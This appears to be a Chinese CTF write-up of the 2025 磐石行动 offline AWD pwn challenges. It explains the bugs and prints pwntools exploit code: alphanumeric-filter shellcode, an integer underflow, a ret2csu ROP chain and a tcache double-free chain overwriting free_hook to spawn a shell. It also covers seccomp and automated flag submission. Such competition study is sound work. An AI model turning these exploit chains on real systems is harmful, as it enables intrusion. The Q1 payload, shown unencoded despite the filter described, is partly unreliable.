---
title: 2025 磐石行动 - 线下 AWD PWN
contest: 2025 磐石行动 (线下 AWD)
year: 2025
difficulty: hard
vuln_type: [ret2libc, heap_exploit, pwn_unknown]
tags: [AWD, 磐石行动, shellcode, cat-flag, Halloween, candy, msg, conn, addConn-removeConn-editConn-listConn, ret2csu, seccomp, system-then-ORW, flag-submission-API, multi-target]
attack_chain: ["Q1 Halloween: 输入 shellcode 触发 Prank Time → push 0 + shellcraft.cat('/flag/flag')", "白名单字符过滤 (0-9, A-Z, a-z) → 纯 shellcode 不行，需 alphanumeric shellcode 或用过滤字符巧妙组合", "Q2 candy treat(): readint() 选 candy → 'How many?' 输入 -6 → 整数下溢减计数器", "Q3 msg/conn 系统: 4 选项 send/receive/history/ConnectionManager", "send 触发 readn() malloc 0x500 → buf 0x128 后 ret2csu → leak printf → system", "Q4 connMngr: add/free/show/edit → tcache dup + chunk overlap + free_hook 改 system", "flag 通过 POST /api/awd/batch_flag/ 提交拿 token+pk", "hosts 10.103.x.3-30 30 台机器多目标攻击"]
key_payload: "payload = shellcraft.cat('/flag/flag') + push 0 (rsp 16 字节对齐)"
one_liner: AWD 多目标攻击：4 题 30 机器脚本化攻击 + flag 自动提交
lesson: AWD 模式要脚本化批量打；seccomp 时 system 不可用要 ORW；整数下溢注意负数边界
quality: high
---

# 2025 磐石行动 - 线下 AWD PWN

原文 https://www.ctfiot.com/274233.html （看雪 zer00ne）

## 比赛模式
- 30 台机器（10.103.1.3 ~ 10.103.30.3）
- 多目标攻击：每打一台拿 flag → POST API 提交
- Flag API: `https://10.10.26.6/api/awd/batch_flag/`
  ```json
  {
    "token": "87caca98ffb1d59926e65b7fbdc61462",
    "flag": "flag{...}",
    "pk": "166f8e1b83cd20e2cc1a813383e9d1b6"
  }
  ```

## Q1: Halloween / Prank Time
```c
read(0, &buf, 0x100);
for (i = 0; i < strlen(buf); i++) {
    if ((buf[i] <= '/' || buf[i] > '9')
        && (buf[i] <= '@' || buf[i] > 'Z')
        && (buf[i] <= '`' || buf[i] > 'z')) {
        printf("nauty!%c", buf[i]);
        return;
    }
}
// 字符必须全是 [0-9 A-Z a-z]
secret = Secret;
*(QWORD*)Secret = buf;
*(QWORD*)(secret+1) = v20;
// ... 复制到 Secret 函数参数
Secret();
```
**攻击：**
- shellcode 必须是 alphanumeric（只含 0-9 A-Z a-z）
- 用 `push 0; shellcraft.cat("/flag/flag")` 拼凑

```python
from pwn import *
from ae64 import AE64

def t1(sc):
    io.sendlineafter(b"Halloween is coming, momo wants candy.......", b"1")
    io.sendafter(b"Emmmmmm...... Prank Time!", sc)

payload = asm("push 0" + shellcraft.cat("/flag/flag"))
t1(payload)
t = io.recvuntil(b"flag", timeout=3)
flag = io.recvuntil(b"}", timeout=3)
```

## Q2: candy treat() 整数下溢
```c
int *treat() {
    int v0;
    v2 = readint();
    puts("Which kind of candy do you want to give to momo?");
    printf("%s?", &candyList[24*v2]);
    printf("How many?");
    v0 = dword_40B0[6*v2] - readint();   // 整数下溢
    dword_40B0[6*v2] = v0;
}
```
- 输入 `-6` 让 dword 变成 0xFFFFFFFA
- 后续可被利用

## Q3: msg 系统
```c
void send(fd, buf, n, flags) {
    s = malloc(0x28);
    s[0] = malloc(0x10);   // IP
    s[1] = malloc(0x10);   // Port
    s[2] = ...
    s[3] = readn();         // malloc(0x500) + read
    msgHistory[i] = s;
}

void receive(idx) {
    v6 = msgHistory[idx-1];
    n = malloc_usable_size(v6[3]);
    memcpy(dest, v6[3], n);   // memcpy 长度用 malloc_usable_size 泄露真实大小
    printf("Message: %s", dest);
}
```
- `malloc_usable_size` 可能返回比实际分配大的值 → memcpy 越界读
- 然后用 ROP/Csu leak printf

```python
csu1 = 0x4025DA
magic = 0x40133D-1
offset = 0xe3b04 - libc.sym.printf
payload = b'a'*0x128 + p64(csu1) + p64(offset) + p64(0x405040+0x3d) + p64(0)*4 + p64(magic) + p64(csu1) + p64(0)*5 + p64(0x405040) + p64(0x4025C0)
```

## Q4: connMngr 堆利用
```c
addConn(idx, ip, port, comment)  // malloc 两块 + 内容
removeConn(idx)  // 双重 free
editConn(idx, ip, port, comment, nbytes, content)  // read(0, ptr, nbytes) 任意长度
```
- 双重 free + chunk overlap + free_hook
- 经典 tcache dup 套路

```python
add(0, 0x10, b'a'*0x10)
add(1, 0x10, b'a'*0x10)
free(1); free(0)
add(0, 0x500, b'a'*0x10)   # 触发 unsorted bin leak
add(1, 0x20, b'a')
add(2, 0x500, b'a'*0x10)
add(3, 0x200, b'a'*0x50)
free(0); free(2)
add(0, 0x500, b'0')
show()  # leak libc
...
edit(6, p64(0)*5 + p64(0x21) + p64(0)*3 + p64(0x31) + p64(0)*2)
free(7)
edit(6, p64(0)*5 + p64(0x21) + p64(fhook-8)*2)
add(8, 0x10, b"/bin/sh\x00" + p64(system))
free(8)  # system('/bin/sh')
```

## seccomp 检测
```c
A = sys_number
A >= 0x40000000 ? dead :   // 64-bit
A == execve ? dead :
A == open ? dead :
A == openat ? dead :
A == execveat ? dead :
A == mmap ? dead :
A == fstat ? dead :
return ALLOW
```
- 拦截 execve / open / mmap 等
- 必要时改走 ORW

## 教学价值
- **AWD 模式** = 多目标脚本化攻击
- **alphanumeric shellcode** 是输入字符过滤的标准解
- **ret2csu** 是没有 system 时的标准 leak+exec
- **seccomp** 限制 syscall 要 ORW
- **flag 自动提交** 是 AWD 必备

## 工具
- pwntools
- ae64 (alphanumeric shellcode encoder)
- requests (flag API)
- gdb-pwndbg
- libc-database
